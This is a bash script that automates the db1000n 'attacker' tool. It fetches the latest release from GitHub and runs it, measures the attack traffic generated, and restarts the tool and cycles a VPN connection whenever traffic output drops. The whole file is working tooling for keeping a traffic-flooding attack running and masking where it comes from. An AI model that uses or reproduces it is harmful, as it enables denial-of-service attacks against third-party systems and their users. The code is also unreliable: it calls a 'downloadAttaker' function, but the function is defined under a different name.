#!/bin/bash

# This script automatically downloads and starts db1000n then monitors its effectivity.
# If needed it restarts the connection and db1000n.
# It also checks for a new release of db1000n every 3 hours and if available downloads it and run it

# Run this script with three params (e.g. './activity-check_new.sh 1200 12 my-vpn')
# 1200 is the number of seconds to wait before restarting db1000n and the NM connection (optional)
# 12 is the expected amount of mega bytes to be generated regard to stats. If this value is not met then restart (optional)
# Actual restart will happen only if two conditions above are met
# 'my-vpn' is the connection name in Network Manager (optional)

downloadDB1000n() {
  echo ========================================================================
  echo $(date): Downloading attacker release: ${LATEST_TAG}

  wget -c "https://github.com/Arriven/db1000n/releases/download/${LATEST_TAG}/db1000n_linux_amd64.tar.gz" -O - | tar -xz db1000n
  LOCAL_VERSION=$LATEST_RELEASE_VERSION

  echo $(date): Downloading completed
  echo ========================================================================
}

killPreviousAttacker() {
  echo ========================================================================
  echo "$(date): Summary generated: ${SUMMARY_GENERATED}MB"

  if [ ! -z "${ATTACKER_PID}" ]; then
    echo "$(date): Killing previous app. PID: ${ATTACKER_PID}"
    kill $ATTACKER_PID
  fi
}

getAttackerVersion() {
  echo $(./db1000n -version | grep -Po "Version: .*]\[" | grep -Po "\d*" | tr -d '\n')
}

isNewerAttackerAvailable() {
  LATEST_TAG=$(curl -s https://api.github.com/repos/Arriven/db1000n/releases | jq -r '.[0].tag_name')
  LATEST_RELEASE_VERSION=$(echo $LATEST_TAG | grep -Po "\d*" | tr -d '\n')

  echo "$(date): Checking for a new attacker"
  echo "Latest relese: ${LATEST_TAG}"

  if [ -s "./db1000n" ]; then
    LOCAL_VERSION=$(getAttackerVersion)

    if [ $LATEST_RELEASE_VERSION -gt $LOCAL_VERSION ]; then
      echo "Local attacker: $LOCAL_VERSION"
      echo "Found newer attacker: $LATEST_RELEASE_VERSION"
      return 0
    fi
  else
    echo "No local attacker found"
    return 0
  fi

  return 1
}

startAttacker() {
  if [ ! -z "${CONNECTION_NAME}" ]; then
    echo "$(date): Reconnecting to the VPN: $CONNECTION_NAME"
    nmcli c down $CONNECTION_NAME
    sleep 3
    nmcli c up $CONNECTION_NAME
  fi

  PROCESS_STARTUP_TIME=$(date +%s)
  LOG_FILE="logs/${PROCESS_STARTUP_TIME}.txt"

  echo ========================================================================
  echo "Starting attacker: ${LOCAL_VERSION}"
  echo "Current log file is:" $LOG_FILE

  ./db1000n >>$LOG_FILE &
  ATTACKER_PID=$!

  if [ -z "${ATTACKER_PID}" ]; then
    echo "Can not start attacker!"
    exit
  fi
}

echo "$(date): +++ Started Auto-Attacker script +++"

mkdir -p logs

CHECK_FOR_NEW_RELEASE_INTERVAL=10800 # Each 3 hours

TIME_OUT_SEC=${1:-1200}
MIN_TRAFFIC="${2:-8}"
CONNECTION_NAME=$3
SUMMARY_GENERATED=0
TRAFFIC_STATS_COUNT=0

echo "Timeout in seconds: $TIME_OUT_SEC"
echo "Minimal traffic before attacker reset: ${MIN_TRAFFIC}MB"
echo "Connection to use: ${CONNECTION_NAME:-"No connection provided"}"
echo "Intial launch..."

if isNewerAttackerAvailable; then
  downloadAttaker
fi

LAST_RELEASE_CHECK_TIME=$(date +%s)
LOCAL_VERSION=$(getAttackerVersion)
startAttacker $CONNECTION_NAME

echo "Starting loop..."
while true; do
  traffic_stats_count=$(grep -Po "Traffic stats" $LOG_FILE | wc -l)

  if [ $traffic_stats_count -gt $TRAFFIC_STATS_COUNT ]; then
    TRAFFIC_STATS_COUNT=$traffic_stats_count
    TOTAL=$(grep -Po "Total\s*\|\s*\d+\s*\|\s*\d+\s*\|\s*\d+\s*\|\s*\d+\.\d+" "./$LOG_FILE" | grep -Po "\d+\.\d+" | tail -n1)

    if [ -z "${PREVIOUS_TOTAL}" ]; then
      TRAFFIC=$TOTAL
    else
      TRAFFIC=$(echo "$TOTAL - $PREVIOUS_TOTAL" | bc)
    fi

    PREVIOUS_TOTAL=$TOTAL
    SUMMARY_GENERATED=$(echo "$TRAFFIC + $SUMMARY_GENERATED" | bc)

    echo -ne "Generated: $SUMMARY_GENERATED MB"\\r
    if (($(echo "$TRAFFIC < $MIN_TRAFFIC" | bc -l))) && [ "$(expr $(date +%s) - $PROCESS_STARTUP_TIME)" -gt $TIME_OUT_SEC ]; then
      killPreviousAttacker
      startAttacker
    fi
  fi

  if [ "$(expr $(date +%s) - $LAST_RELEASE_CHECK_TIME)" -gt $CHECK_FOR_NEW_RELEASE_INTERVAL ]; then
    LAST_RELEASE_CHECK_TIME=$(date +%s)

    if isNewerAttackerAvailable; then
      killPreviousAttacker
      downloadAttaker
      startAttacker
    fi
  fi

  sleep 5
done
